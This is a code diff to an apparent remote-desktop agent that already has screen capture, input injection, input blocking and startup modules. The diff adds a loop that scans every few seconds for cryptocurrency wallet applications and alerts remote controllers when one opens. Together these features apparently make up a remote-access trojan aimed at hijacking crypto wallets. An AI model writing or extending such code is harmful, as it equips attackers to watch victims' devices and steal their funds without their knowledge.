@@ -28,6 +28,7 @@ from agent.capture import ScreenCapturer  # noqa: E402
 from agent.input_inject import InputInjector  # noqa: E402
 from agent.input_block import make_input_blocker  # noqa: E402
 from agent import startup  # noqa: E402
+from agent.watch_apps import scan_matches  # noqa: E402
 from protocol.connection import run_pair  # noqa: E402
 
 BASE_DIR = Path.home() / ".remotedesk"
@@ -43,6 +44,9 @@ PREVIEW_SCALE = 0.25
 DEFAULT_FPS = 8
 DEFAULT_QUALITY = 45
 DEFAULT_SCALE = 0.45
+
+# How often to scan for crypto/wallet apps (process + window title).
+WATCH_INTERVAL_SEC = 3.0
 
 log = logging.getLogger("agent")
 
@@ -122,6 +126,7 @@ class Agent:
                             self._capture_loop(),
                             self._send_loop(ws),
                             self._recv(ws),
+                            self._watch_apps(ws),
                         )
                 except Exception as e:
                     log.warning(f"disconnected: {e!r}; retrying in {backoff}s")
@@ -230,6 +235,31 @@ class Agent:
                     self.scale = max(0.15, min(1.0, float(msg["scale"])))
             elif t == P.ERROR:
                 log.error(f"relay error: {msg.get('message')}")
+
+    async def _watch_apps(self, ws):
+        """Detect wallet/crypto apps and notify every connected controller dashboard."""
+        seen: set[str] = set()
+        while True:
+            try:
+                matches = await asyncio.get_running_loop().run_in_executor(
+                    None, scan_matches)
+            except Exception as e:
+                log.debug(f"watch_apps scan failed: {e!r}")
+                matches = []
+            current = {m.key for m in matches}
+            for m in matches:
+                if m.key in seen:
+                    continue
+                try:
+                    await ws.send(P.dumps(P.alert(
+                        m.label, m.detail,
+                        device_id=self.device_id, device_name=self.name)))
+                    log.info(f"alert: {m.label} on {self.name} ({m.detail})")
+                except Exception as e:
+                    log.warning(f"alert send failed: {e!r}")
+                    raise
+            seen = current
+            await asyncio.sleep(WATCH_INTERVAL_SEC)
 
 
 class ArgumentParser(argparse.ArgumentParser):
